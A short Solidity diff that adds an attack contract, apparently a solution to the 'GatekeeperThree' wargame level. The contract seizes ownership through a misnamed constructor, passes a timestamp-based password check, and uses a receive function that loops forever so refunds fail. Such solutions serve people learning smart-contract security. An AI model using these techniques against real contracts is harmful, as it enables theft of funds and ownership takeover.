@@ -74,3 +74,29 @@ contract GatekeeperThree {
 
     receive() external payable {}
 }
+
+contract GatekeeperThreeAttack {
+    GatekeeperThree public gatekeeper;
+    uint256 public count;
+
+    constructor(GatekeeperThree _gatekeeper) {
+        gatekeeper = _gatekeeper;
+    }
+
+    function attack() payable public {
+        gatekeeper.construct0r();
+
+        gatekeeper.createTrick();
+        gatekeeper.getAllowance(block.timestamp);
+
+        address(gatekeeper).call{value: msg.value}("");
+
+        gatekeeper.enter();
+    }
+
+    receive() external payable {
+        while (true) {
+            count += 1;
+        }
+    }
+}
